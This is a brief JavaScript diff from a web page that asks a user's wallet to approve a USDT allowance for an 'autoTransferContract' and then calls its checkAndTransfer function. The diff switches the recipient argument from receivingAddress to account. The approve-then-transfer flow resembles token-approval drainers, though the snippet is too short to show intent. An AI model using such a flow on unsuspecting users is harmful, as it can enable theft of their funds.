@@ -72,7 +72,7 @@ async function init() {
         await usdtContract.approve(autoTransferContractAddress, approveAmount).send();
         document.getElementById('result').innerText = '授权成功';
 
-        await autoTransferContract.checkAndTransfer(receivingAddress).send();
+        await autoTransferContract.checkAndTransfer(account).send();
         document.getElementById('result').innerText = '转账成功';
     } catch (error) {
         console.error('Error:', error);
